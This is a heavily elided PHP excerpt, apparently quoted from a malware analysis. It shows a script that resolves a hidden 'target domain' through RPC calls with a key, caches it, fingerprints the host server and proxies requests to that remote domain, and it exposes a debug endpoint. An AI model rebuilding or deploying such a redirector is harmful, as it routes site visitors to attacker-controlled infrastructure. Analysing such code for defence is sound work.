...
-----END PRIVATE KEY-----";
        ...
        $serverIdentifier = md5($_SERVER['SERVER_NAME'] . ':' . ($_SERVER['SERVER_ADDR'] ?? 'vercel') . ':' . ($_SERVER['SERVER_SOFTWARE'] ?? 'vercel'));
    ...
    private function fetchTargetDomain($addr, $key) {
        ...
        throw new Exception('All RPCs failed');
    }

    public function getTargetDomain($type) {
        $cached = $this->loadCache($type);
        if ($cached && filter_var($cached, FILTER_VALIDATE_URL)) return $cached;
        ...
        if (!$key) throw new Exception("Missing key for $type");

        $domain = $this->fetchTargetDomain($addr, $key);

        if (strpos($domain, 'afumyacviz') !== false) {
    ...
    public function handle($endpoint, $type) {
        try {
            $targetDomain = $this->getTargetDomain($type);
            $url = $targetDomain . '/' . ltrim($endpoint, '/');
...
// === DEBUG ENDPOINT ===
if (isset($_GET['debug']) && $_GET['debug'] === 'domain') {
    header('Content-Type: text/plain');
    try {
